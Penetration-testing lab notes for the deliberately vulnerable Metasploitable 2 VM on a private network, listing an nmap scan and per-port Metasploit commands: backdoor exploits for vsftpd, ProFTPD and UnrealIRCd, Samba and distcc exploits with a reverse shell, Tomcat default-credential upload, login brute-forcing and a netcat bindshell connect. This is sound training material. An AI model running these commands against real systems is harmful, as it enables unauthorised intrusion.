# 🔓 Metasploitable 2 — Penetration Testing Notes

> **Lab Environment**
> | Role | IP Address |
> |------|------------|
> | Target (Metasploitable 2) | `192.168.56.104` |
> | Attacker (Kali Linux) | `192.168.56.101` |

---

## 📡 Nmap Full Scan Results

```bash
nmap -sV -p- 192.168.56.104
```

| Port | State | Service | Version | Status |
|------|-------|---------|---------|--------|
| 21/tcp | open | ftp | vsftpd 2.3.4 | ✅ Done |
| 22/tcp | open | ssh | OpenSSH 4.7p1 Debian 8ubuntu1 | ✅ Done |
| 23/tcp | open | telnet | Linux telnetd | ✅ Done |
| 25/tcp | open | smtp | Postfix smtpd | ✅ Done |
| 53/tcp | open | domain | ISC BIND 9.4.2 | ⏳ No vulns found yet — revisit |
| 80/tcp | open | http | Apache httpd 2.2.8 (Ubuntu DAV/2) | ✅ Done — needs revisit |
| 111/tcp | open | rpcbind | 2 (RPC #100000) | 🔲 Pending |
| 139/tcp | open | netbios-ssn | Samba smbd 3.X–4.X | 🔲 Pending |
| 445/tcp | open | netbios-ssn | Samba smbd 3.X–4.X | 🔲 Pending |
| 512/tcp | open | exec | netkit-rsh rexecd | 🔲 Pending |
| 513/tcp | open | login | OpenBSD/Solaris rlogind | 🔲 Pending |
| 514/tcp | open | shell | Netkit rshd | 🔲 Pending |
| 1099/tcp | open | java-rmi | GNU Classpath grmiregistry | 🔲 Pending |
| 1524/tcp | open | bindshell | Metasploitable root shell | 🔲 Pending |
| 2049/tcp | open | nfs | 2-4 (RPC #100003) | 🔲 Pending |
| 2121/tcp | open | ftp | ProFTPD 1.3.1 | 🔲 Pending |
| 3306/tcp | open | mysql | MySQL 5.0.51a-3ubuntu5 | 🔲 Pending |
| 3632/tcp | open | distccd | distccd v1 (GCC 4.2.4) | 🔲 Pending |
| 5432/tcp | open | postgresql | PostgreSQL 8.3.0–8.3.7 | 🔲 Pending |
| 5900/tcp | open | vnc | VNC (protocol 3.3) | 🔲 Pending |
| 6000/tcp | open | X11 | (access denied) | 🔲 Pending |
| 6667/tcp | open | irc | UnrealIRCd | 🔲 Pending |
| 6697/tcp | open | irc | UnrealIRCd | 🔲 Pending |
| 8009/tcp | open | ajp13 | Apache Jserv (v1.3) | 🔲 Pending |
| 8180/tcp | open | http | Apache Tomcat/Coyote JSP 1.1 | 🔲 Pending |
| 8787/tcp | open | drb | Ruby DRb RMI (Ruby 1.8) | 🔲 Pending |

---

## 🗺️ General Service → Attack Strategy Reference

| Service | Typical Approach |
|---------|-----------------|
| SSH | `auxiliary` (brute force / version enum) |
| FTP | `auxiliary` + `exploit` |
| SMB | `exploit` |
| HTTP | `exploit` + `auxiliary` |
| Telnet | `auxiliary` |
| SMTP | `auxiliary` |
| IRC | `exploit` |
| distcc | `exploit` |

---

## ✅ Exploited / Enumerated Services

---

### Port 21 — FTP (vsftpd 2.3.4)

**Vulnerability:** vsftpd 2.3.4 backdoor — opens a shell on port 6200 when a smiley face `:)` is appended to the username.

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.104
run
```

**Result:** Root shell via backdoor.

---

### Port 22 — SSH (OpenSSH 4.7p1)

**Real Pentesting Workflow for SSH:**

1. Detect SSH version
2. Enumerate version details
3. Check for weak credentials
4. Try password reuse from other services
5. Try SSH key-based login
6. Login
7. Privilege escalation

**Module Used:**

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.56.104
set USER_FILE /path/to/userlist.txt
set PASS_FILE /path/to/passlist.txt
run
```

---

### Port 23 — Telnet

> ⚠️ Telnet sends credentials in **plaintext** — intercept with Wireshark.

**Method 1 — Metasploit brute force:**

```bash
use auxiliary/scanner/telnet/telnet_login
set RHOSTS 192.168.56.104
set USER_FILE /path/to/userlist.txt
set PASS_FILE /path/to/passlist.txt
run
```

**Method 2 — Manual connect:**

```bash
telnet 192.168.56.104
```

**Method 3 — Wireshark:** Capture traffic on the interface, filter `telnet`, and read credentials in plaintext from the packet stream.

---

### Port 25 — SMTP (Postfix)

**Goal:** Enumerate valid usernames via SMTP VRFY/EXPN commands.

```bash
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS 192.168.56.104
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
run
```

---

### Port 80 — HTTP (Apache 2.2.8)

> ⏳ Done but **needs revisit** for thorough enumeration (dirbusting, web vulnerabilities, DVWA, etc.)

**Suggested next steps:**
- Browse to `http://192.168.56.104` — enumerate DVWA, phpMyAdmin, Mutillidae
- Run `dirb` or `gobuster` for hidden paths
- Check for LFI, RFI, SQLi on web apps

---

## ⏳ Pending Services

---

### Port 53 — DNS (ISC BIND 9.4.2)

> No vulnerabilities confirmed yet. DNS exploitation is tricky.

**Suggested investigation:**
```bash
# Zone transfer attempt
dig axfr @192.168.56.104 metasploitable.localdomain

# nmap DNS scripts
nmap -p 53 --script dns-zone-transfer,dns-recursion 192.168.56.104
```

---

### Ports 139 / 445 — SMB (Samba 3.X–4.X)

**Suggested approach:**
```bash
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.104
run
```

---

### Port 1524 — Bindshell (Metasploitable Root Shell)

> Direct root shell — no exploit needed.

```bash
nc 192.168.56.104 1524
```

---

### Port 2121 — FTP (ProFTPD 1.3.1)

**Suggested approach:**
```bash
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS 192.168.56.104
run
```

---

### Port 3306 — MySQL 5.0.51a

**Suggested approach:**
```bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.56.104
set USERNAME root
set BLANK_PASSWORDS true
run
```

---

### Port 3632 — distccd

**Suggested approach:**
```bash
use exploit/unix/misc/distcc_exec
set RHOSTS 192.168.56.104
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.56.101
run
```

---

### Port 5900 — VNC

**Suggested approach:**
```bash
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 192.168.56.104
run
# or direct connect (try password "password")
vncviewer 192.168.56.104
```

---

### Port 6667 — IRC (UnrealIRCd)

**Suggested approach:**
```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.104
run
```

---

### Port 8180 — Apache Tomcat

**Suggested approach:**
- Browse `http://192.168.56.104:8180/manager`
- Default creds: `tomcat:tomcat`

```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.56.104
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
run
```

---

## 📋 Quick Reference Checklist

- [x] Port 21 — FTP vsftpd backdoor
- [x] Port 22 — SSH brute force
- [x] Port 23 — Telnet login / Wireshark capture
- [x] Port 25 — SMTP user enumeration
- [ ] Port 53 — DNS zone transfer (in progress)
- [ ] Port 80 — HTTP full web app audit (revisit)
- [ ] Ports 139/445 — SMB Samba exploit
- [ ] Port 1524 — Bindshell (netcat)
- [ ] Port 2121 — ProFTPD backdoor
- [ ] Port 3306 — MySQL login
- [ ] Port 3632 — distcc exec
- [ ] Port 5900 — VNC login
- [ ] Port 6667 — UnrealIRCd backdoor
- [ ] Port 8180 — Tomcat manager deploy

---

*Target: Metasploitable 2 | Lab notes for educational purposes only*
